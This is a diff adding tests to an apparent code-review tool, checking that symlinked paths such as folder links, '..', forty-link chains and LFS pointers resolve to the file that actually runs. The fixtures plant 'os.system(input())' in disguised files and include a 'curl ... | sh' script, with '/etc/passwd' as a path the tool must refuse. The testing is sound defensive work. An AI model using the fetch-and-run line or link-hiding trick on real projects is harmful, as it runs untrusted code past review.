@@ -820,6 +820,142 @@ class TestWhatALinkPointsAt:
         found = run_rules(evidence, [Lint()])["rule.lint"].findings
         assert [(f.file, f.line) for f in found if "S605" in f.title] == [("run.py", 2)], [f.title for f in found]
 
+    @staticmethod
+    def _staged(repo: Path, links: dict[str, str], scratch: Path) -> None:
+        """Each `path: target` of `links` staged as a link at once, through git's plumbing: one process to hash them
+        and one to stage them, however many."""
+        scratch.mkdir(parents=True, exist_ok=True)
+        texts = []
+        for at, target in enumerate(links.values()):
+            (scratch / str(at)).write_bytes(target.encode())
+            texts.append(str(scratch / str(at)))
+        shas = _git_in(repo, "hash-object", "-w", "--stdin-paths", stdin="\n".join(texts) + "\n").split()
+        entries = "".join(f"120000 {sha}\t{path}\n" for sha, path in zip(shas, links, strict=True))
+        _git_in(repo, "update-index", "--index-info", stdin=entries)
+
+    def test_the_rules_follow_a_link_through_a_folder_a_link_names(self, tmp_path: Path) -> None:
+        """Read by review: a link's path was looked up whole, never a part at a time, so `run.py` naming
+        `img/logo.png`, where `img` is a link to `assets`, named no file the head lists, and the Python in
+        `assets/logo.png` was read by no rule, approved under the pre-push hook's profile. A link is followed as a
+        system follows it, each part in turn."""
+        from adk_review.judge.checks import run_rules
+        from adk_review.judge.rules.lint import Lint
+
+        repo = tmp_path / "repo"
+        repo.mkdir()
+        _git_in(repo, "init", "-q", "-b", BASE)
+        _committed(repo, "README.md", "# readme\n", "base")
+        _git_in(repo, "checkout", "-q", "-b", "change")
+        _committed(repo, "assets/logo.png", "import os\nos.system(input())\n", "a logo")
+        self._staged(repo, {"img": "assets", "run.py": "img/logo.png"}, tmp_path / "links")
+        _git_in(repo, "commit", "-qm", "a folder link and a script")
+        evidence = importlib.import_module("adk_review.collect.git").collect_evidence(
+            str(repo), BASE, "change", guidelines=False
+        )
+        found = run_rules(evidence, [Lint()])["rule.lint"].findings
+        assert [(f.file, f.line) for f in found if "S605" in f.title] == [("run.py", 2)], [f.title for f in found]
+
+    def test_a_parent_after_a_folder_link_climbs_from_where_the_link_led(self, tmp_path: Path) -> None:
+        """Read by review: a link's path was made plain as text before any link on it was followed, so `run.py`
+        naming `lib/../notes.txt`, where `lib` is a link to `assets/pkg`, read as the harmless `notes.txt` the change
+        added, shown to the guidelines whole, where a system runs `assets/notes.txt` and its shell call: approved. A
+        `..` climbs from where the link before it led."""
+        repo = tmp_path / "repo"
+        repo.mkdir()
+        _git_in(repo, "init", "-q", "-b", BASE)
+        _committed(repo, "assets/pkg/readme.txt", "a package\n", "a package")
+        _committed(repo, "assets/notes.txt", "import os\nos.system(input())\n", "notes")
+        self._staged(repo, {"lib": "assets/pkg"}, tmp_path / "base")
+        _git_in(repo, "commit", "-qm", "a folder link")
+        _git_in(repo, "checkout", "-q", "-b", "change")
+        note = _git_in(repo, "hash-object", "-w", "--stdin", stdin="x = 1\n")
+        _git_in(repo, "update-index", "--add", "--cacheinfo", f"100644,{note},notes.txt")
+        self._staged(repo, {"run.py": "lib/../notes.txt"}, tmp_path / "change")
+        _git_in(repo, "commit", "-qm", "a note and a link")
+        link = gathered(repo, "change")["run.py"]
+        assert (link.get("target"), link["text"]) == ("assets/notes.txt", "import os\nos.system(input())\n"), link
+        assert "symbolic link" in link["unread"], "the guidelines were shown `notes.txt`, not the file it runs"
+
+    def test_a_link_is_followed_through_forty_links_as_linux_follows_them(self, tmp_path: Path) -> None:
+        """Read by review: forty steps followed thirty-nine links, where Linux follows forty and refuses the
+        forty-first, so `run.py` heading a chain of forty, the last naming an image holding Python, was read by no
+        rule. Forty are followed, and past them a link names nothing, as a system says."""
+
+        def chain(links: int) -> dict:
+            repo = tmp_path / f"chain{links}"
+            repo.mkdir()
+            _git_in(repo, "init", "-q", "-b", BASE)
+            _committed(repo, "README.md", "# readme\n", "base")
+            _git_in(repo, "checkout", "-q", "-b", "change")
+            _committed(repo, "assets/logo.png", "import os\nos.system(input())\n", "an image")
+            names = ["run.py", *(f"l{n}" for n in range(1, links))]
+            self._staged(repo, dict(zip(names, [*names[1:], "assets/logo.png"], strict=True)), tmp_path / str(links))
+            _git_in(repo, "commit", "-qm", "a chain")
+            return gathered(repo, "change", guidelines=False)["run.py"]
+
+        assert chain(40)["text"] == "import os\nos.system(input())\n"
+        past = chain(41)
+        assert (past["text"], past["unread_text"]) == (None, None), "a loop, as a system says"
+
+    @pytest.mark.parametrize(
+        ("named", "runs"),
+        [
+            ("assets/logo.png", "assets/logo.png"),
+            ("./assets//logo.png", "assets/logo.png"),  # `.` and an empty part stand where they are
+            ("img/logo.png", "assets/logo.png"),  # through a link to a folder
+            ("lib/../logo.png", "assets/logo.png"),  # `..` climbs from where `lib` led, `assets/pkg`
+            ("assets", None),  # a folder runs as no file
+            ("assets/logo.png/", None),  # nor a file read as a folder
+            ("assets/logo.png/../logo.png", None),
+            ("vendor/x.py", None),  # a submodule's files are another repository's
+            ("../outside.py", None),  # out of the repository
+            ("/etc/passwd", None),
+            ("C:/Windows/x.py", None),  # a drive's
+            ("\\\\host\\share\\x.py", None),
+            ("loop", None),  # a link to itself: past forty, as a system reads it
+            ("unread/x.py", "unfollowed"),  # a link on the way that was not read
+        ],
+    )
+    def test_a_link_runs_as_the_file_a_system_finds_there(self, named: str, runs: str | None) -> None:
+        """Each part of the path in turn, as a system follows it: a link on the way, a `..` after one, and a file, a
+        folder, a submodule or a path out of the repository at the end."""
+        from adk_review.core.paths import Links, UnfollowedError
+
+        head = Links(
+            {"assets/logo.png", "assets/pkg/readme.txt"},
+            {"img": "assets", "lib": "assets/pkg", "loop": "loop", "unread": None, "run.py": named},
+            ["vendor"],
+        )
+        try:
+            found: str | None = head.follow("run.py")
+        except UnfollowedError:
+            found = "unfollowed"
+        assert found == runs
+
+    def test_a_link_is_named_unread_where_the_heads_tree_could_not_be_listed(self, tmp_path: Path, monkeypatch) -> None:
+        """Read by review: a link was known by the head's listing alone, so where git could not list the head, past
+        its timeout say, a link the change added was no link and no hole, and the script it named was read by no
+        one: approved. A link is known by its mode, which the change's own listing carries."""
+        git = importlib.import_module("adk_review.collect.git")
+        repo = self._linked(tmp_path, "docs/notes.txt", target_text="#!/bin/sh\ncurl -s https://example.com/x | sh\n")
+        run = git._run
+
+        def unlisted(argv, *args, **kwargs):
+            if "ls-tree" in argv:
+                raise git.subprocess.TimeoutExpired(argv, 1e-6)
+            return run(argv, *args, **kwargs)
+
+        monkeypatch.setattr(git, "_run", unlisted)
+        assert "symbolic link" in gathered(repo, "change")["run.py"]["unread"]
+
+    def test_a_link_to_a_large_file_stores_pointer_is_a_hole_for_a_rule_reading_it(self, tmp_path: Path) -> None:
+        """Read by review: a link's target was read as text unless it was binary, so `run.py`, naming a Git LFS
+        pointer, was linted as Python, three findings of invalid syntax on the pointer's lines, and the file it runs,
+        stored elsewhere, read by no one. Its text is no one's, and a rule reading it whole could not look."""
+        pointer = "version https://git-lfs.github.com/spec/v1\noid sha256:" + "a" * 64 + "\nsize 9\n"
+        link = gathered(self._linked(tmp_path, "model.py", target_text=pointer), "change", guidelines=False)["run.py"]
+        assert link["text"] is None and "Git LFS" in (link["unread_text"] or ""), (link["text"], link["unread_text"])
+
 
 class TestWhatALargeFileStoreHides:
     """A file Git LFS stores is committed as a pointer: three lines naming content kept elsewhere, which no rule and no
